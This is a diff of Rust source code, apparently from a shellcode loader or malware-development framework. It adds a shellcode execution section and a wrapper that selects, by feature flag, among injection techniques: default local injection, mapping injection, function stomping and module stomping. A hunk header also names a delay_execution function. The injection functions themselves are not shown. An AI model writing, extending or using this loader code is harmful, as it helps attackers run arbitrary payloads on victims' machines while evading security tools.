@@ -1,3 +1,7 @@
+// =======================================================================================================
+// SHELLCODE EXECUTION METHODS
+// =======================================================================================================
+
 use std::ffi::c_void;
 use std::ptr::{null_mut, null};
 use std::mem::{transmute, size_of};
@@ -24,16 +28,29 @@ fn delay_execution() {
 // INJECTION WRAPPER
 // =======================================================================================================
 
-fn inject_shellcode(bytes_to_load: &[u8]) -> Result<*mut c_void, String> {
+fn inject_shellcode(bytes_to_load: &[u8]) -> Result<*mut c_void, i32> {
     #[cfg(feature = "InjectionDefaultLocal")]
     {
         use super::injection::inject_default_local;
-        inject_default_local(bytes_to_load).map_err(|e| format!("Injection failed: {}", e))
+        inject_default_local(bytes_to_load)
     }
     
-    #[cfg(not(any(feature = "InjectionDefaultLocal")))]
+    #[cfg(feature = "InjectionMappingLocal")]
     {
-        Err("Nomethod enabled".to_string())
+        use super::injection::inject_mapping_local;
+        inject_mapping_local(bytes_to_load)
+    }
+    
+    #[cfg(feature = "InjectionFunctionStomping")]
+    {
+        use super::injection::inject_function_stomping;
+        inject_function_stomping(bytes_to_load)
+    }
+    
+    #[cfg(feature = "InjectionModuleStomping")]
+    {
+        use super::injection::inject_module_stomping;
+        inject_module_stomping(bytes_to_load)
     }
 }
 
